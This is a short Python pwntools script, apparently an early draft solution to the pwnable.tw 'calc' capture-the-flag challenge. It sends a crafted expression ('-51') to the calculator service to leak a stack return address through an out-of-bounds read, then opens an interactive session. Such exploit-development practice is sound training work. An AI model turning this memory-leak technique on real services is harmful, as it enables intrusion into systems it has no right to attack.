# Have you ever use Microsoft calculator?
# nc chall.pwnable.tw 10100

from sys import argv

from pwn import *

context(arch='i386', os='linux')

host = '127.0.0.1'
port = 8888
if len(argv) > 1 and argv[1] == 'remote':
    host = 'chall.pwnable.tw'
    port = 10100
r = remote(host, port)

# add: 0x08048f45

# r.recvuntil('=== Welcome to SECPROG calculator ===\n')
# r.sendline('1+2')

r.recvuntil('\n')

def send(expr):
    r.sendline(expr)
    return int(r.recvuntil('\n')[:-1])

# for i in range(0x63, 0xa0):
#     print(send(str(i).encode()))

# ret_addr = send('-51')
# print('ret_addr =', hex(ret_addr))

ret_addr = send('-51')
print('ret_addr =', hex(ret_addr))

r.interactive()
